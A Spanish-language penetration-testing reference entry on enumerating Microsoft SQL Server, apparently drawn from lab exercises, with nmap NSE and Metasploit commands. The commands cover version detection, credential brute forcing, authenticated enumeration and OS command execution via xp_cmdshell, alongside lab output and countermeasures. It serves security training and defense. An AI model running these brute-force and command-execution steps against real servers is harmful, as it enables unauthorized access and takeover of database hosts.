---
title: Enumeración MSSQL (Microsoft SQL Server)
slug: enumeracion-mssql
aliases: [Microsoft SQL Server, MS-SQL, mssqlclient, xp_cmdshell]
fase: [Enumeración]
plataforma: Windows
dificultad: Intermedia
mitre: [T1046]
related: [enumeracion-mysql, enumeracion-oracle, enumeracion-postgresql, analisis-sqli]
learning_refs: []
---

# Enumeración MSSQL (Microsoft SQL Server)

## Descripción
Microsoft SQL Server es un sistema de gestión de bases de datos relacional de Microsoft que opera en el puerto 1433/tcp (por defecto) y 1434/UDP (SQL Browser). La enumeración incluye: identificar la versión exacta, detectar cuentas con contraseña vacia (especialmente SA), realizar fuerza bruta de credenciales, y con acceso, enumerar configuración completa. El procedimiento almacenado `xp_cmdshell`, cuando esta habilitado, permite ejecutar comandos del sistema operativo directamente desde SQL Server, convirtiendo la enumeración en ejecución remota de código.

## Herramientas
- **nmap** (`ms-sql-info`, `ms-sql-brute`, `ms-sql-empty-password`, `ms-sql-xp-cmdshell`) — enumeración vía NSE
- **Metasploit** (`mssql_login`, `mssql_enum`) — fuerza bruta y enumeración completa

## Comandos / Ejemplos

### Enumeración con Nmap NSE
```bash
# Deteccion de version de SQL Server
nmap 10.4.27.79 -p1433 --script ms-sql-info
# Resultado: "Microsoft SQL Server 2019 RTM", version "15.00.2000.00"

# Detectar cuenta SA con contrasena vacia
nmap 10.4.27.79 -p1433 --script ms-sql-empty-password

# Fuerza bruta de credenciales
nmap 10.4.27.79 -p1433 --script ms-sql-brute \
  --script-args userdb=/root/Desktop/wordlist/common_users.txt,\
passdb=/root/Desktop/wordlist/100-common-passwords.txt
# Resultado: dbadmin:bubbles1, auditor:jasmine1, admin:anamaria

# Ejecucion de comandos via xp_cmdshell (si esta habilitado)
nmap 10.4.27.79 -p1433 --script ms-sql-xp-cmdshell \
  --script-args mssql.username=admin,mssql.password=anamaria,\
ms-sql-xp-cmdshell.cmd="type C:\flag.txt"

# Listar bases de datos
nmap 10.4.27.79 -p1433 --script ms-sql-tables \
  --script-args mssql.username=admin,mssql.password=anamaria
```

### Fuerza bruta con Metasploit
```bash
use auxiliary/scanner/mssql/mssql_login
set rhosts 10.4.25.105
set user_file /root/Desktop/wordlist/common_users.txt
set pass_file /root/Desktop/wordlist/100-common-passwords.txt
set verbose false
exploit
# Resultado: WORKSTATION\sa: (contrasena vacia)
#            WORKSTATION\dbadmin:anamaria
#            WORKSTATION\auditor:nikita
```

### Enumeración completa post-autenticación
```bash
use auxiliary/admin/mssql/mssql_enum
set rhosts 10.4.25.105
set username dbadmin
set password anamaria
exploit
# Resultado:
# - Version: SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
# - OS: Windows Server 2016 Datacenter
# - xp_cmdshell is Enabled  <-- CRITICO: RCE disponible
# - remote access is Enabled
# - Bases de datos: master, tempdb, model, msdb (con rutas fisicas)
# - System logins: sa, dbadmin
# - Stored procedures publicos: xp_dirtree, xp_fileexist, xp_fixeddrives,
#   xp_regread, xp_grantlogin, xp_revokelogin
```

### Ejecución de comandos vía xp_cmdshell
```bash
# Si xp_cmdshell esta disponible → acceso a comandos del SO
# Desde consola MSSQL o via Metasploit:
use auxiliary/admin/mssql/mssql_exec
set rhosts 10.4.25.105
set username dbadmin
set password anamaria
set CMD "whoami"
run

# xp_dirtree → listado de directorios del servidor
# xp_fileexist → verificar existencia de archivos
# xp_fixeddrives → listar unidades de disco
```

## Contramedidas
- Deshabilitar `xp_cmdshell` si no es necesario: `EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;`
- Cambiar la contraseña de la cuenta SA y deshabilitarla si no se usa
- No exponer el puerto 1433 a internet; usar firewall para restringir acceso
- Aplicar principio de minimo privilegio en cuentas de base de datos
- Deshabilitar SQL Browser (puerto UDP 1434) si no se necesitan instancias nombradas
- Mantener SQL Server actualizado con los ultimos service packs y patches de seguridad
- Monitorear eventos de auditoría de SQL Server para detectar accesos sospechosos

## Referencias
- Allen, M. (2022). *Mastering Kali Linux for Advanced Penetration Testing* (4th ed.). Packt Publishing.
- Rahalkar, S. (2017). *Metasploit for Beginners*. Packt Publishing.
- MITRE Corporation. (2024). ATT&CK Technique T1046: Network Service Discovery. https://attack.mitre.org/techniques/T1046/
- MITRE Corporation. (2024). ATT&CK Technique T1059.003: Command and Scripting Interpreter: Windows Command Shell. https://attack.mitre.org/techniques/T1059/003/
